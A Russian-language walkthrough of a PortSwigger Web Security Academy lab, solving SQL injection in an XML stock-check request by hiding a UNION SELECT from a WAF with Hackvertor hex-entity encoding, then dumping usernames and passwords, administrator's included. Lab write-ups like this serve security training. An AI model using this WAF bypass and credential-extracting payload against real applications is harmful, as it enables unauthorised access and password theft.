Эта лабораторная работа содержит уязвимость SQL-инъекции **в функции проверки запасов**. Результаты запроса возвращаются в ответе приложения, поэтому вы можете использовать атаку UNION для получения данных из других таблиц.

Брандмауэр веб-приложений (WAF) блокирует запросы, содержащие явные признаки атаки с помощью SQL-инъекции.

## Дано

База данных содержит `users` таблица, содержащая имена и пароли зарегистрированных пользователей.

## Задача

Зайти под администратора

# Разведка

- Функция проверки запасов
```
POST /product/stock HTTP/2
Host: 0a6e00e003f15c0e84650e11001c0094.web-security-academy.net
Cookie: session=HOahebfMBNoNYYSelKcSsXQ0btouZAkj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a6e00e003f15c0e84650e11001c0094.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a6e00e003f15c0e84650e11001c0094.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- При инъекции детектит и выводит "Attack detected"

- Пробуем обмануть кодировкой при помощи расширения в burp Hackvertor
До
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
После
```
<@hex_entities>UNION SELECT NULL<@/hex_entities>
```


# Атака

- Так как поддерживается 1 лишь значение мы объединим столбцы 
```
<@hex_entities>	1 UNION SELECT username || '~' || password FROM users
<@/hex_entities>
```
Ответ
```
carlos~1o71rxy6wfm8jpa9k1sh
wiener~17hdedxqvbmj63iam25v
administrator~ceszi4ld8mbaqy57qpad
160 units
```

